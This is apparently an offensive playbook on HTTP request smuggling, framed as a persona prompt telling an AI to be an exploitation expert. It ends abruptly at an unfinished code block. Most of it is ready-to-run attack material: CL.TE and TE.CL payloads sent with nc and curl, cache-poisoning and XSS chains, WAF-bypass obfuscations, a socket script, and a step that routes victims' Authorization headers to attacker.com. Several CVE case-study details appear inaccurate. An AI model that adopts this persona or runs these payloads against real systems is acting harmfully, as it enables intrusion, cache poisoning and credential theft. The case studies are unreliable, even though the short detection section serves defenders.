# HTTP Request Smuggling Chains: Cache Poisoning, Credential Theft, and Security Bypass

## Expert Role Definition

You are the world foremost expert in HTTP request smuggling exploitation and chaining. You understand the fundamental disagreement between front-end proxies and back-end servers about where one request ends and the next begins. You specialize in crafting malformed HTTP requests that exploit parsing differences between HTTP implementations including Apache, Nginx, IIS, HAProxy, Cloudflare, AWS ALB, and custom proxy stacks. You approach every dual-layer architecture with the understanding that any discrepancy in Content-Length and Transfer-Encoding parsing can be weaponized. You think in terms of request framing, byte-level parsing, and connection state rather than traditional request-response semantics.

---

## Core Concepts

HTTP request smuggling exploits discrepancies in how front-end proxies and back-end servers parse HTTP request boundaries. When two systems disagree on where one request ends and the next begins, an attacker can craft a request that causes the back-end to process part of the next victim's request as part of the smuggled request.

CL.TE (Content-Length vs Transfer-Encoding): The front-end proxy uses the Content-Length header to determine request boundaries, while the back-end server uses Transfer-Encoding: chunked. The attacker sends a request with both headers where the Content-Length covers a benign portion but the Transfer-Encoding includes additional smuggled data. The front-end forwards the entire request, but the back-end processes only the chunked portion, leaving the remaining bytes as the start of the next request.

TE.CL (Transfer-Encoding vs Content-Length): The opposite scenario where the front-end uses Transfer-Encoding and the back-end uses Content-Length. The attacker crafts a chunked request where the final chunk appears complete to the front-end but the back-end sees additional data as a separate request.

H2.CL (HTTP/2 downgraded to HTTP/1.1): The front-end accepts HTTP/2 requests with a Content-Length header, then forwards them to the back-end as HTTP/1.1. The attacker manipulates the Content-Length in the HTTP/2 HEADERS frame to cause a mismatch when the request is downgraded. This is particularly dangerous because HTTP/2 implementations often have different validation rules than HTTP/1.1.

H2.TE (HTTP/2 Transfer-Encoding abuse): Some HTTP/2 implementations allow Transfer-Encoding headers that should be stripped during the HTTP/2 to HTTP/1.1 translation. This allows the attacker to smuggle chunked-encoded data that the front-end does not understand but the back-end processes.

The key to successful smuggling is understanding exactly how each parser in the chain handles: whitespace around header values, case sensitivity of header names, invalid Transfer-Encoding values, duplicate Content-Length headers, and characters outside the ASCII range. These edge cases are where parsing divergences occur.

---

## Pre-requisite Knowledge

You must understand HTTP/1.1 request framing including Content-Length and Transfer-Encoding: chunked encoding. Knowledge of how front-end proxies (HAProxy, Nginx, Apache, Cloudflare, AWS ALB) parse HTTP requests is essential. Familiarity with HTTP/2 to HTTP/1.1 downgrade behavior and how different servers handle malformed requests is required.

Understanding of TCP connection reuse and keep-alive behavior is critical because smuggling depends on the back-end server reusing the same TCP connection for multiple requests. Knowledge of how different web servers handle partial requests, malformed headers, and ambiguous request bodies is necessary for crafting successful payloads.

Experience with Burp Suite extensions including HTTP Request Smuggler, and tools like smuggler.py and h2csmuggler is valuable. Understanding of cache behavior, CDN caching rules, and how caches serve content based on URL and Host headers is essential for cache poisoning chains.

---

## Chain Architecture / Attack Flow Diagram

```
+-----------------------------------------------------------+
|            HTTP Request Smuggling Attack Flow             |
+-----------------------------------------------------------+
|                                                            |
|  +----------+    Normal Request    +-----------+           |
|  | Attacker |--------------------->| Front-end |           |
|  |          |                      |  (Proxy)  |           |
|  +----------+                      +-----+-----+           |
|       |                                  |                 |
|       | Smuggled Request                 | Forwarded      |
|       v                                  v                 |
|  +------------------------------------+                   |
|  | CL.TE Attack                       |                   |
|  | CL: 50 (covers benign body)        |                   |
|  | TE: chunked with smuggled request   |                   |
|  | Front-end uses CL, back-end uses TE |                   |
|  +------------------+-----------------+                   |
|                     v                                      |
|  +------------------------------------+                   |
|  | Back-end Server                    |                   |
|  | Processes chunked body             |                   |
|  | Smuggled bytes become next request  |                   |
|  | Victim request gets poisoned        |                   |
|  +------------------------------------+                   |
|                                                            |
|  Cache Poisoning Chain:                                    |
|  Smuggle request --> Poisoned cache entry                  |
|  Victim requests URL --> Serves poisoned response          |
|  Poisoned response contains XSS/malicious content         |
|                                                            |
|  Credential Theft Chain:                                   |
|  Smuggle request --> Captures victim Authorization header  |
|  Stolen credentials --> Account takeover                   |
+-----------------------------------------------------------+
```

---

## Step-by-Step Exploitation Methodology

### Step 1: Identify Front-end and Back-end Architecture

Determine what front-end proxy and back-end server the target uses. Look for server headers, error pages, and response behavior differences that reveal the stack.

```bash
# Identify server technology
curl -I http://target.com/
curl -I http://target.com/nonexistent

# Check for proxy-specific headers
curl -I http://target.com/ | grep -iE 'server|x-powered|x-cache|x-varnish|via|x-forwarded'

# Test for HTTP/2 support
curl --http2 -I https://target.com/

# Check connection behavior
curl -v http://target.com/ 2>&1 | grep -i 'connection\|keep-alive\|transfer-encoding'
```

### Step 2: Test for CL.TE Vulnerability

Craft a CL.TE payload where the front-end uses Content-Length and the back-end uses Transfer-Encoding: chunked.

```bash
# CL.TE smuggling payload using netcat
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 32\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n' | nc target.com 80

# Or using curl with raw request
curl -X POST http://target.com/ \
  -H 'Content-Length: 32' \
  -H 'Transfer-Encoding: chunked' \
  -d '0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n'
```

### Step 3: Test for TE.CL Vulnerability

Craft a TE.CL payload where the front-end uses Transfer-Encoding and the back-end uses Content-Length.

```bash
# TE.CL smuggling payload
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n' | nc target.com 80

# The back-end sees Content-Length: 3, processes '8\r',
# leaving '\nSMUGGLED\r\n0\r\n\r\n' as the next request
```

### Step 4: Timing-Based Detection

Use timing analysis to detect smuggling vulnerabilities by measuring response delays when sending smuggled requests with timeouts.

```bash
# Timing-based CL.TE detection
# Send a request that smuggles a request with a timeout
# If the front-end returns slowly, smuggling is likely working
time curl -X POST http://target.com/ \
  -H 'Content-Length: 32' \
  -H 'Transfer-Encoding: chunked' \
  -d '0\r\n\r\nGET /timeout HTTP/1.1\r\nHost: target.com\r\nX-Timeout: 10\r\n\r\n'

# Compare with normal request timing
time curl http://target.com/
```

### Step 5: Request Smuggling for Cache Poisoning

Smuggle a request that gets cached by a front-end CDN or cache, then serve poisoned content to other users.

```bash
# Smuggle a GET request that poisons the cache
# The smuggled request is a GET to a cacheable URL
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 44\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /poison HTTP/1.1\r\nHost: target.com\r\n\r\n' | nc target.com 80

# Second request to the poisoned URL serves malicious content
curl http://target.com/poison
```

### Step 6: Request Smuggling for XSS Delivery

Smuggle a response that contains an XSS payload, served to the next victim who requests the same URL.

```bash
# Smuggle a request that triggers a response containing XSS
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 60\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /reflect?x=<script>alert(1)</script> HTTP/1.1\r\nHost: target.com\r\n\r\n' | nc target.com 80

# Victim requests /reflect and receives the XSS payload
```

### Step 7: Request Smuggling for Credential Theft

Smuggle a request that captures the victim's Authorization header by routing it to an attacker-controlled endpoint.

```bash
# Smuggle a request that sends victim's auth to attacker server
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 65\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: attacker.com\r\n\r\n' | nc target.com 80

# Or use a request that causes the victim's request to be sent to attacker
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 67\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET @attacker.com/collect HTTP/1.1\r\nHost: target.com\r\n\r\n' | nc target.com 80
```

### Step 8: HTTP/2 Request Smuggling

Exploit HTTP/2 to HTTP/1.1 downgrade vulnerabilities by manipulating HEADERS frame content-length values.

```bash
# H2.CL smuggling using h2csmuggler
h2csmuggler -u https://target.com/ -t http://back-end:80 -p 'GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n'

# Or manually craft HTTP/2 HEADERS frame with mismatched content-length
# This requires understanding of HTTP/2 frame format
```

---

## Tool Arsenal

### Burp Suite HTTP Request Smuggler Extension

```bash
# Install from BApp Store
# 1. Send a request to Repeater
# 2. Right-click -> Extensions -> HTTP Request Smuggler -> Smuggle attack
# 3. Select attack type (CL.TE, TE.CL, etc.)
# 4. Configure the smuggled request
# 5. Launch attack and analyze responses
```

### smuggler.py

```bash
# Install smuggler
git clone https://github.com/defparam/smuggler.git
cd smuggler
pip install -r requirements.txt

# Run smuggler against target
python smuggler.py -u http://target.com/ -v

# With custom smuggled request
python smuggler.py -u http://target.com/ -c 'GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n' -v
```

### h2csmuggler

```bash
# Install h2csmuggler
git clone https://github.com/anshumanbh/h2csmuggler.git
cd h2csmuggler
pip install -r requirements.txt

# Run H2.CL smuggling attack
python h2csmuggler.py -u https://target.com/ -t http://back-end:80 --smuggle 'GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n'
```

### Custom Smuggling Detection Script

```python
#!/usr/bin/env python3
import socket, ssl, time, sys

def test_smuggling(host, port, use_ssl=False):
    # CL.TE payload
    payload = (
        'POST / HTTP/1.1\r\n'
        f'Host: {{host}}\r\n'
        'Content-Length: 32\r\n'
        'Transfer-Encoding: chunked\r\n'
        '\r\n'
        '0\r\n'
        '\r\n'
        'GET /smuggle-test HTTP/1.1\r\n'
        f'Host: {{host}}\r\n'
        '\r\n'
    )

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if use_ssl:
        ctx = ssl.create_default_context()
        sock = ctx.wrap_socket(sock, server_hostname=host)
    
    sock.connect((host, port))
    sock.send(payload.encode())
    
    time.sleep(1)
    try:
        response = sock.recv(4096)
        if b'HTTP' in response:
            print(f'[+] Response received: {response[:100]}')
            return True
    except Exception as e:
        print(f'[-] No response: {e}')
    finally:
        sock.close()
    return False

if __name__ == '__main__':
    host = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
    test_smuggling(host, 80)
```

---

## Real-World Case Studies

### Case Study 1: HAProxy HTTP Request Smuggling (CVE-2021-40346)

In 2021, a critical HTTP request smuggling vulnerability was discovered in HAProxy versions before 2.4.0. The vulnerability existed in how HAProxy parsed the Content-Length header when it appeared before the Transfer-Encoding header. An attacker could craft a request with a Content-Length header containing a negative value (Content-Length: -3) which HAProxy would parse as 0 bytes, but the back-end server would parse the Transfer-Encoding header and process the chunked body. The exploit chain was: send a CL.TE smuggling request with negative Content-Length, HAProxy forwards the request to the back-end, the back-end processes the chunked body containing a smuggled request, and the smuggled request accesses restricted admin endpoints. This vulnerability affected thousands of organizations running HAProxy as their front-end proxy.

### Case Study 2: Apache Tomcat CVE-2023-45648

Apache Tomcat was found vulnerable to HTTP request smuggling through improper parsing of Transfer-Encoding headers. The vulnerability affected Tomcat versions 9.0.0.M1 to 9.0.80, 10.1.0-M1 to 10.1.15, and 11.0.0-M1 to 11.0.0-M11. The issue was that Tomcat did not properly handle Transfer-Encoding headers with leading whitespace or certain malformed values. An attacker could smuggle requests by sending Transfer-Encoding headers with tab characters or other whitespace that Tomcat would accept but upstream proxies would reject. The impact included cache poisoning, XSS delivery to other users, and access to restricted endpoints through request tunneling.

### Case Study 3: Envoy Proxy Smuggling (CVE-2021-29492)

Envoy proxy was vulnerable to HTTP request smuggling through improper handling of URI-encoded characters in the request path. An attacker could use percent-encoded characters in the request URI that Envoy would decode differently from the back-end server. The exploit involved sending a request with %20 (space) or %0A (newline) characters in the URI that Envoy would decode but the back-end would not, causing the request parsing to diverge. This allowed CL.TE and TE.CL smuggling attacks against any environment using Envoy as a front-end proxy. The vulnerability was particularly impactful because Envoy is widely used in Kubernetes service mesh architectures.

### Case Study 4: Cloudflare Request Smuggling

Researchers discovered that Cloudflare's HTTP/2 implementation could be abused for request smuggling when used with certain back-end server configurations. The issue involved Cloudflare's handling of HTTP/2 HEADERS frames with Content-Length headers that conflicted with the frame payload. When Cloudflare forwarded these requests to the back-end as HTTP/1.1, the Content-Length mismatch caused the back-end to process the request differently. This enabled attackers to smuggle requests past Cloudflare's Web Application Firewall rules, access origin-only endpoints, and poison the Cloudflare cache to serve malicious content to other users.

---

## Bypass Techniques and Evasion

### WAF Bypass via Smuggling

```bash
# Smuggle requests past WAF by wrapping malicious request inside benign one
# The WAF only sees the benign outer request
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 45\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin/sql HTTP/1.1\r\nHost: target.com\r\n\r\n' | nc target.com 80

# The WAF sees POST / with benign body
# The back-end receives GET /admin/sql as a separate request
```

### Content-Length Obfuscation

```bash
# Use multiple Content-Length headers
POST / HTTP/1.1\r\n
Host: target.com\r\n
Content-Length: 0\r\n
Content-Length: 10\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: target.com\r\n
\r\n

# Different parsers may use different Content-Length values
```

### Transfer-Encoding Obfuscation

```bash
# Use case variations
Transfer-Encoding: chunked
Transfer-Encoding: Chunked
Transfer-Encoding: CHUNKED
Transfer-Encoding: chunKed

# Use whitespace tricks
Transfer-Encoding: chunked 
Transfer-Encoding:  chunked
Transfer-Encoding:chunked

# Use tab characters
Transfer-Encoding:\tchunked

# Use multiple Transfer-Encoding headers
Transfer-Encoding: chunked\r\n
Transfer-Encoding: identity
```

---

## Defensive Indicators / Detection

1. Request parsing anomalies: Monitor for requests with both Content-Length and Transfer-Encoding headers, unusual header ordering, or malformed header values
2. Timing anomalies: Detect unexpected delays in request processing that indicate smuggling attempts
3. Response anomalies: Watch for responses that contain HTTP headers or status codes from other requests
4. Cache anomalies: Monitor for cache entries that serve unexpected content or content from different URLs

```
# Suricata rule for detecting smuggling attempts
alert http any any -> any any (msg:"HTTP Request Smuggling attempt"; \
  http.header:Transfer-Encoding; \
  http.header:Content-Length; \
  sid:1000002; rev:1;)
```

---

## Impact Assessment Framework

| Impact | Low (1-3) | Medium (4-6) | High (7-8) | Critical (9-10) |
|--------|-----------|--------------|------------|-----------------|
| **Confidentiality** | Info leak | User data access | Admin access | Full system compromise |
| **Integrity** | Data modification | Cache poisoning | XSS delivery | RCE via smuggled requests |
| **Availability** | Service degradation | Partial DoS | Complete DoS | Persistent compromise |
| **Scope** | Single user | Multiple users | Entire organization | All cache users |

CVSS 3.1 for request smuggling to cache poisoning: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N = 9.3 (Critical)

---

## Common Pitfalls and Anti-Patterns

1. Assuming single-server architecture is safe: Even single-server setups may have internal proxies or load balancers that create parsing differences.
2. Not testing all parser combinations: Each combination of front-end and back-end has different parsing behaviors. Test CL.TE, TE.CL, H2.CL, and H2.TE separately.
3. Ignoring connection state: Smuggling depends on TCP connection reuse. If connections are not reused, smuggling will not work.
4. Overlooking partial overlaps: The smuggled request does not need to be fully contained in the first request. Partial overlaps can still cause parsing issues.
5. Not verifying impact: A successful smuggling proof-of-concept must demonstrate concrete impact such as accessing restricted resources or poisoning cache entries.
6. Forgetting to test HTTP/2: Many modern deployments use HTTP/2 between front-end and back-end, creating additional smuggling opportunities.

---

## Advanced Variations

### CL.0 Smuggling

```bash